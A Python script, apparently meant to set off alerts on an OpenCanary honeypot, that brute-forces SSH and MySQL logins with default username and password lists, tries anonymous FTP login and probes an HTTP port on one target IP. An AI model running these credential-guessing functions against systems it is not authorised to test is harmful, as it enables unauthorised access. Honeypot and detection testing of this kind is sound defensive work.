import paramiko
import ftplib
import requests
import mysql.connector
from mysql.connector import errors
from time import sleep

def brute_force_ssh(target_ip, port=22):
    usernames = ['admin', 'root', 'user']
    passwords = ['123456', 'password', 'admin']
    for user in usernames:
        for passwd in passwords:
            try:
                print(f"Attempting SSH login with {user}:{passwd}")
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(target_ip, port=port, username=user, password=passwd, timeout=2)
                print("[+] SSH Login Successful")
                client.close()
                return
            except paramiko.AuthenticationException:
                print("[-] SSH Login Failed")
            except Exception as e:
                print(f"Error: {e}")

def ftp_attack(target_ip, port=21):
    try:
        print(f"Attempting FTP login to {target_ip}")
        ftp = ftplib.FTP()
        ftp.connect(target_ip, port)
        ftp.login("anonymous", "test@example.com")
        print("[+] FTP Login Successful")
        ftp.quit()
    except Exception as e:
        print(f"[-] FTP Attack Failed: {e}")

def http_probe(target_ip, port=80):
    try:
        print(f"Probing HTTP server on {target_ip}")
        response = requests.get(f"http://{target_ip}:{port}")
        print(f"[+] HTTP Response: {response.status_code}")
    except Exception as e:
        print(f"[-] HTTP Probe Failed: {e}")

def mysql_brute_force(target_ip, port=3306):
    usernames = ['root', 'admin', 'test']
    passwords = ['password', '12345', 'admin']
    for user in usernames:
        for passwd in passwords:
            try:
                print(f"Attempting MySQL login with {user}:{passwd}")
                conn = mysql.connector.connect(
                    host=target_ip,
                    port=port,
                    user=user,
                    password=passwd
                )
                print("[+] MySQL Login Successful")
                conn.close()
                return
            except errors.ProgrammingError:
                print("[-] MySQL Login Failed")
            except Exception as e:
                print(f"Error: {e}")

if __name__ == "__main__":
    target_ip = "127.0.0.1"  # Change to the IP of your OpenCanary honeypot
    sleep(2)
    brute_force_ssh(target_ip)
    sleep(2)
    ftp_attack(target_ip)
    sleep(2)
    http_probe(target_ip)
    sleep(2)
    mysql_brute_force(target_ip)
